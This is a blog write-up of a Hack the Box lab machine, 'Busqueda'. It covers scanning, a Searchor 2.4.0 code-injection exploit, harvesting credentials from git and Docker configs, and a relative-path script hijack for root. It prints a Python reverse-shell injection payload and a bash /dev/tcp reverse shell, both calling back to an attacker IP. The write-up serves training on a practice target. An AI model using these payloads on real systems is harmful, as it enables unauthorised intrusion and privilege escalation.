+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-04-29T11:00:00.000Z
publishDate = 2023-04-29T11:00:00.000Z
description = " "
summary = ""
draft = false
slug = "hack-the-box-busqueda"
tags = ["hack the box", "Easy", "Linux", "Flask", "Reverse Shell", "Burpsuite", "Docker", "Code Analysis", "Bash", "Code Injection", "Gitea", "SSH Proxy"]
title = "Hack the Box - Busqueda"
url = "/hack-the-box-busqueda"
thumbnail = "/images/busqueda/logo.png"
+++

Welcome back! Today we're going to do the Hack the Box machine Busqueda. This machine is listed as an easy Linux machine. Let's see what's in store!

As usual, we start with a `rustscan`. Here are our results.

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Well, with only two options for ports, let's see what's on the web port. We add `searcher.htb` to our host file and see what's there.

![](/images/busqueda/bus1.png)

While we poke around, we'll kick off a `gobuster` to see what else might be around.

Command:
`gobuster dir -u http://searcher.htb -w /PATH/TO/WORDLIST -t 80`
`gobuster dns -u http://searcher.htb -w /PATH/TO/WORDLIST -t 80`

Now when we try to search for something, we get a patch with a `/search` endpoint and a `URL` we should use?

![](/images/busqueda/bus2.png)

We see the site is powered by `Flask` and `Searchor 2.4.0`. A quick Google shows us there seems to be some viable exploits - [like this](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/blob/main/README.md). Let's try to replicate this.

We start our `nc` listener on port `80` and fire our the following request in `burpsuite`.

`',+exec("import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(('10.10.14.2',80))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(['/bin/sh','-i'])%3b"))%23`

![](/images/busqueda/bus3.png)
![](/images/busqueda/bus4.png)

We get a connection back as `svc`. We're also able to grab the `user.txt` flag while we're at it!

![](/images/busqueda/user.png)

We copy over some `linpeas` and see what it might find. Now, during our enumeration we see another site being hosted within - `gittea`.

![](/images/busqueda/bus5.png)

Knowing this we can look for some `git` related information. We look at the `.gitconfig` file in the `svc` home directory and see it's linked to `cody`.

![](/images/busqueda/bus6.png)

Going back to `/var/www/app` we start digging through the `.git` contents. In order for us to be able to get to the `gittea` site, we need to be able to proxy our traffic through via `ssh`. So we check the contents of the `config` file here and see some credentials.

![](/images/busqueda/bus7.png)

The password didn't work for `cody` gut they did work for `svc`. We're now able to do a bit more via `ssh`. Now when we run `sudo -l` we see that we can leverage something.

![](/images/busqueda/bus8.png)

So we need to take a look at this directory for what we might be able to leverage. We aren't able to read the scripts, but we re-run our command to see what it's output is for each option. In this case we see the running `docker` images.

![](/images/busqueda/bus9.png)

So we proxy some traffic through `ssh` and see what's in the `gittea` subdomain.

Command:
`ssh -L 8888:localhost:3000 svs@searcher.htb`

Then we login as `cody` to see what's going on. Two users have made commits, `cody` and `administrator`. So we'll need a way to potentially extract some `administrator` credentials or priviledges as well. Other than that, there really isn't too much available here.

Back to the terminal. At this point we're going to try and leverage `Docker` and / or the scripts available to move forward. If you're familiar with `Docker` you know that you can use `Docker-inspect` to [obtain details](https://docs.docker.com/engine/reference/commandline/inspect/) about images. It looks like this script is simply leveraging the same command.

Command:
`sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea`
`sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db`

This gives us back some good information, particularly passwords.

![](/images/busqueda/bus10.png)

We use the `mysql` credentials to log into the `gitea` as `administrator`. We see there is a `scripts` repo created by the `administrator`. These are the scripts that correlate to our `sudo -l` command. Now, as we inspect the code we something stand out in the `system-checkup.py`.

![](/images/busqueda/bus11.png)

Yep, that argument calls a LOCAL version of `full-checkup.sh`. This means that it doesn't check for the correct file path. We can simply create our own version of `full-checkup.sh`! You can bet that my version has a `reverse-shell` in it!

So we create a file with the following in it:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/9001 0>&1
```

Then save it as `full-checkup.sh`. Change its permissions with `chmod +x`. Then we run our `sudo` command:

`sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

Next thing you know we catch a shell!

![](/images/busqueda/bus12.png)

There we have it, the `root.txt` flag and another machine down! I would say this is a good machine for some basic understanding of code analysis and how separate 'modules' can work together.